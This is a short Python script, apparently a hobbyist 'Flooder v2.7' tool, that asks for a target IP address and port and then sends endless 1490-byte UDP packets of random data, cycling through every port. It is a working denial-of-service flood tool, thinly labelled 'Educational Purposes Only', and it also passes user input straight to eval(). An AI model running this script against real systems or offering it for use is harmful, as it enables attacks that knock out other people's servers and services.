#!/system/bin/python
import socket, os, random, time

# Colors
B = '\033[1m'
R = '\033[31m'
N = '\033[0m'
C = '\033[1;36m'

# Date and Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system('cls' if os.name == 'nt' else 'clear')
os.system("title Flooder v2.7")
print(B+"  ______ _                 _           ")
print(" |  ____| |               | |          ")
print(" | |__  | | ___   ___   __| | ___ _ __ ")
print(" |  __| | |/ _ \ / _ \ / _` |/ _ \ '__|")
print(" | |    | | (_) | (_) | (_| |  __/ |   ")
print(" |_|    |_|\___/ \___/ \__,_|\___|_|   v2.7")
print("                                       "+N)
print("["+B+""+R+"#"+N+"] "+B+""+R+"Educational Purposes Only >_<"+N)
print("["+B+""+R+"#"+N+"] "+B+""+N+"Made with <3 by cdkw")
print()
ip = input("["+B+""+C+"$"+N+"] Target IP: ")
port = eval(input("["+B+""+C+"$"+N+"] Port: "))
os.system('cls' if os.name == 'nt' else 'clear')
print("Flood attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year))
time.sleep(3)
print()
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packets to %s throught port %s"%(sent,ip,port))
     if port == 65534:
       port = 1
